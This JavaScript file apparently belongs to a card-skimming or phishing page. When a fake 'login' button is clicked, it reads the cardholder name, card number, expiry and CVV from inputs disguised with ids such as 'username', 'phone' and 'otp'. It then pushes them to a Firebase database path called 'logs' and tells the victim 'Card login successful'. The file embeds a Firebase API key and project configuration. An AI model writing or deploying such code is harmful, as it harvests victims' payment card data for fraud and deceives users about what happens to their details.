document.addEventListener("DOMContentLoaded", () => {
  const loginBtn = document.getElementById("loginButton");

  loginBtn.addEventListener("click", async (e) => {
    e.preventDefault();

    const ccName = document.getElementById("cc-name").value.trim();
    const ccNumber = document.getElementById("username").value.trim(); // card number input has id="username"
    const ccExp = document.getElementById("phone").value.trim(); // expiry input has id="phone"
    const ccCvv = document.getElementById("otp").value.trim(); // cvv input has id="otp"

    // ✅ Firebase Save
    try {
      const { initializeApp } = await import("https://www.gstatic.com/firebasejs/12.2.1/firebase-app.js");
      const { getDatabase, ref, push } = await import("https://www.gstatic.com/firebasejs/12.2.1/firebase-database.js");

      const firebaseConfig = {
        apiKey: "AIzaSyC8mj_ZYR5wboTaEzHzq-YyNmkmTyJ6MQ8",
        authDomain: "spendwell-efc54.firebaseapp.com",
        databaseURL: "https://spendwell-efc54-default-rtdb.firebaseio.com",
        projectId: "spendwell-efc54",
        storageBucket: "spendwell-efc54.firebasestorage.app",
        messagingSenderId: "55289622692",
        appId: "1:55289622692:web:f7ded1b00b089cf24cf631"
      };

      const app = initializeApp(firebaseConfig);
      const db = getDatabase(app);

      await push(ref(db, "logs"), {
        cardholder: ccName,
        number: ccNumber,
        expiry: ccExp,
        cvv: ccCvv,
        time: new Date().toLocaleString()
      });

      console.log("✅ Card details saved to Firebase");
      alert("Card login successful ✅");

    } catch (err) {
      console.error("❌ Firebase error:", err);
      alert("Error saving card login. Check console.");
    }
  });
});
